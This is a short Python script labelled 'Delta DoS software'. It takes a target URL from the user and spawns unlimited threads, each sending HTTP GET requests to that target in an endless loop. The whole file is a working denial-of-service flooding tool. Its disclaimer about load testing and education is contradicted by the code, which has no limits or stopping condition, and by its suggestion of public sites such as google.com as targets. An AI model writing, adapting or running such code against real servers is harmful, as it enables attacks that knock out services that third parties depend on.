# coding: utf8
import threading
import requests
print("Delta DoS software")
print("Attention! This software is designed for server load testing using DoS (denial of service) attacks and for educational purposes. Distribution and use to cause damage to the equipment or device is punishable by law. ")
print("Insert IP or Link. Example: http://192.168.0.1 or http://google.com/")
x = input()
def dos():
 while True:
  requests.get(x)
  
while True:
 threading.Thread(target=dos).start()